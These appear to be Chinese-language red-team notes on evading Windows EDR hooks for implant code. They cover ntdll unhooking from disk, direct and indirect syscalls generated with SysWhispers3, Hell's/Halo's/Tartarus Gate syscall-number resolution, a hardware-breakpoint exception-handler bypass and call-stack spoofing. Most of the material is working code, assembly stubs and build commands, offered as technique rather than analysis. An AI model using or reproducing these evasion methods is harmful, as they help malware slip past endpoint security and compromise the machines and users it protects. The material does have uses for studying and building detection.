

## 1. Peruns Fart / Fresh Ntdll from disk


```text
当前进程 ntdll.dll (RWX)
  ┌─────────────────────────┐
  │ .text (含 EDR hook jmp) │ ◄── 用磁盘干净 .text 覆盖
  └─────────────────────────┘
        ▲
        │ NtMapViewOfSection(disk_ntdll)
        │
  磁盘 C:\Windows\System32\ntdll.dll  ← 干净
```


```c
// 步骤：
// 1. CreateFileW("\\Device\\HarddiskVolumeX\\Windows\\System32\\ntdll.dll")  // 用原生路径绕监控
// 2. NtCreateSection (SEC_IMAGE)
// 3. NtMapViewOfSection 到一个新地址
// 4. 找新地址 .text 段
// 5. NtProtectVirtualMemory 把当前 ntdll .text 改 RW
// 6. memcpy 覆盖
// 7. NtProtectVirtualMemory 还原为 RX
```


```asm
NtAllocateVirtualMemory:
    mov r10, rcx
    mov eax, 0x18      ; SSN (Win11 24H2 上的值，每个版本不同)
    syscall
    ret
```


```powershell
git clone https://github.com/klezVirus/SysWhispers3
cd SysWhispers3
python3 syswhispers.py --preset all --action edit -o syscalls
```


```text
syscalls.h    - 函数声明
syscalls.c    - C 胶水代码
syscalls.asm  - MASM 汇编 stub
syscallsstubs.std.x64.asm  - 标准直接 syscall
```


```text
1. 把 .asm 加入项目，启用 MASM (Custom Build Tool)
2. include syscalls.h
3. 调用 Sw3NtAllocateVirtualMemory(...) 替换原 NtAllocateVirtualMemory
```


```c
// syscalls.asm（节选）
// Sw3NtCreateFile PROC
//     mov [rsp +8], rcx
//     mov [rsp+16], rdx
//     mov [rsp+24], r8
//     mov [rsp+32], r9
//     sub rsp, 28h
//     mov ecx, 0x55           ; function hash (动态解析 SSN)
//     call Sw3GetSyscallNumber
//     add rsp, 28h
//     mov rcx, [rsp+8]
//     mov rdx, [rsp+16]
//     mov r8,  [rsp+24]
//     mov r9,  [rsp+32]
//     mov r10, rcx
//     syscall
//     ret
// Sw3NtCreateFile ENDP

#include <windows.h>
#include "syscalls.h"

int main(void) {
    HANDLE hFile = NULL;
    OBJECT_ATTRIBUTES oa;
    UNICODE_STRING uName;
    IO_STATUS_BLOCK iosb;
    WCHAR path[] = L"\\??\\C:\\Windows\\Temp\\edr_test.bin";

    uName.Buffer = path;
    uName.Length = (USHORT)(wcslen(path) * sizeof(WCHAR));
    uName.MaximumLength = uName.Length + sizeof(WCHAR);

    InitializeObjectAttributes(&oa, &uName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    NTSTATUS st = Sw3NtCreateFile(
        &hFile,
        FILE_GENERIC_WRITE,
        &oa,
        &iosb,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        0,
        FILE_OVERWRITE_IF,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0
    );

    if (st >= 0) {
        // 写一些字节略
        Sw3NtClose(hFile);
        return 0;
    }
    return (int)st;
}
```


```text
implant 代码：
    mov r10, rcx
    mov eax, <SSN>
    jmp [<ntdll 中某个 syscall;ret gadget 的地址>]   ; 不是 syscall 在 implant 里
```


```powershell
python3 syswhispers.py --preset all --action edit --mode jumper -o syscalls
# --mode jumper            => indirect syscall
# --mode jumper_randomized => 随机化 jmp 目标减少签名
```


```asm
Sw3NtAllocateVirtualMemory PROC
    mov [rsp+8], rcx
    ...
    mov ecx, 0x18                  ; function hash
    call Sw3GetSyscallNumber       ; 返回 SSN -> eax
    call Sw3GetSyscallAddress      ; 返回 ntdll 中 syscall;ret 地址 -> rbx
    ...
    mov r10, rcx
    jmp rbx                        ; 跳到 ntdll 内合法 syscall 指令
Sw3NtAllocateVirtualMemory ENDP
```

## 4. Hell's Gate / Halo's Gate / Tartarus Gate


### Hell's Gate


### Halo's Gate


```text
正常情况：
  NtAllocateVirtualMemory  SSN = 0x18
  NtQueryInformationProcess SSN = 0x19
  NtProtectVirtualMemory    SSN = 0x50

如果 NtAllocateVirtualMemory 被 hook 看不到 SSN，看邻居：
  上一个未 hook 的导出 SSN = 0x17
  下一个未 hook 的导出 SSN = 0x19
  → NtAllocateVirtualMemory SSN = 0x18
```

### Tartarus Gate


```text
Hell's Gate:    am0nsec/HellsGate
Halo's Gate:    am0nsec/HellsGate (含 fallback 逻辑) / SafeBreach-Labs/HalosGate-PoC
Tartarus Gate:  trickster0/TartarusGate
SysWhispers3:   集成了三者
```

## 5. Hardware Breakpoint Blindside


```c
// 1. AddVectoredExceptionHandler
// 2. 在每个被 hook 函数入口设 DR0..DR3 (最多 4 个，配合 single-step rotate)
// 3. SetThreadContext(thread, &ctx) 写 DRx
// 4. 当 EDR hook trampoline 触发硬件断点 -> VEH 接管
// 5. VEH 把 EXCEPTION_POINTERS->ContextRecord->Rip 改到 ntdll 的合法 syscall;ret
// 6. ContinueExecution

LONG CALLBACK Blindside(EXCEPTION_POINTERS* ep) {
    if (ep->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        DWORD64 rip = ep->ContextRecord->Rip;
        if (rip == g_hookedNtAllocVM) {
            // SSN 已经在 eax；R10 = RCX；跳到 ntdll 的 syscall;ret
            ep->ContextRecord->Rip = (DWORD64)g_syscallGadget;
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}
```


## 6. Call Stack Spoofing


```text
执行流程：
  implant 代码  →  自定义 trampoline (修改 RSP / RBP / 栈内容)
                ↓
                syscall (RtlCaptureStackBackTrace 看到伪造栈)
                ↓
                trampoline 还原 → 继续 implant 代码
```
